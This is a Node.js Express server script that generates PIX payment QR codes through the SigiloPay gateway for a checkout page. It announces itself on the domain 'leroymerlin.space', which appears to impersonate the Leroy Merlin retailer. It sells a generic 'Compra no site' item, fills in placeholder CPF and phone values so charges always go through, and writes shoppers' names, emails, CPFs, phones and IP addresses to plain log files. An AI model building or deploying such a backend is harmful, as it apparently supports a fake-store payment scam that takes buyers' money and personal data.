cat > server.js << 'EOF'
require('dotenv').config();

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');
const QRCode = require('qrcode');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.use((req, res, next) => {
    const log = `[${new Date().toISOString()}] ${req.method} ${req.url} - IP: ${req.ip || req.connection.remoteAddress}`;
    console.log(log);
    fs.appendFileSync('access.log', log + '\n');
    next();
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/checkout', (req, res) => {
    res.sendFile(path.join(__dirname, 'checkout.html'));
});

app.post('/api/pix', async (req, res) => {
    let { amount, nome, email, cpf, telefone } = req.body;

    let valorFinal = Number(amount);
    if (isNaN(valorFinal) || valorFinal <= 0) valorFinal = 1.00;
    valorFinal = Math.round(valorFinal * 100) / 100;

    const cpfLimpo = String(cpf || '').replace(/\D/g, '');
    const cpfFinal = cpfLimpo.length === 11 ? cpfLimpo : '11144477735';
    const telefoneLimpo = String(telefone || '').replace(/\D/g, '');
    const telefoneFinal = telefoneLimpo.length >= 10 ? telefoneLimpo : '11999999999';

    const payload = {
        identifier: `PEDIDO_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
        amount: valorFinal,
        client: {
            name: nome || 'Cliente Anônimo',
            email: email || `cliente_${Date.now()}@email.com`,
            phone: telefoneFinal,
            document: cpfFinal
        },
        products: [{
            id: `PROD_${Date.now()}`,
            name: 'Compra no site',
            quantity: 1,
            price: valorFinal
        }]
    };

    const publicKey = process.env.SIGILO_PUBLIC_KEY;
    const secretKey = process.env.SIGILO_SECRET_KEY;

    if (!publicKey || !secretKey) {
        console.error('❌ CHAVES NÃO CARREGADAS!');
        return res.status(500).json({
            success: false,
            error: 'Configuração do servidor incompleta.'
        });
    }

    try {
        const response = await axios.post(
            'https://app.sigilopay.com.br/api/v1/gateway/pix/receive',
            payload,
            {
                headers: {
                    'x-public-key': publicKey.trim(),
                    'x-secret-key': secretKey.trim(),
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout: 30000
            }
        );

        const pix = response.data.pix;
        const pixCode = pix.payload || pix.code || pix.pixCode || pix.copyPaste || pix.copy_paste || pix.emv || null;

        if (!pixCode) {
            return res.status(500).json({
                success: false,
                error: 'PIX não gerado.'
            });
        }

        const qrCode = await QRCode.toDataURL(pixCode, {
            width: 320,
            margin: 2,
            errorCorrectionLevel: 'M'
        });

        const transacao = {
            id: response.data.transactionId || response.data.id || `TXN_${Date.now()}`,
            valor: valorFinal,
            cliente: payload.client,
            data: new Date().toISOString(),
            ip: req.ip || req.connection.remoteAddress
        };
        fs.appendFileSync('transacoes.log', JSON.stringify(transacao) + '\n');

        return res.json({
            success: true,
            pix_code: pixCode,
            qr_code_base64: qrCode,
            transaction_id: transacao.id,
            valor: valorFinal
        });

    } catch (error) {
        return res.status(error.response?.status || 500).json({
            success: false,
            error: `Falha: ${error.response?.data?.message || error.message}`,
            detalhes: error.response?.data || null
        });
    }
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        chaves_carregadas: !!process.env.SIGILO_PUBLIC_KEY
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('==============================');
    console.log('🔥 SERVIDOR RODANDO');
    console.log(`📍 PORTA: ${PORT}`);
    console.log(`📍 DOMÍNIO: https://leroymerlin.space`);
    console.log(`💳 POST /api/pix`);
    console.log('==============================');
    console.log('');
});

fs.writeFileSync('server.pid', process.pid.toString());
EOF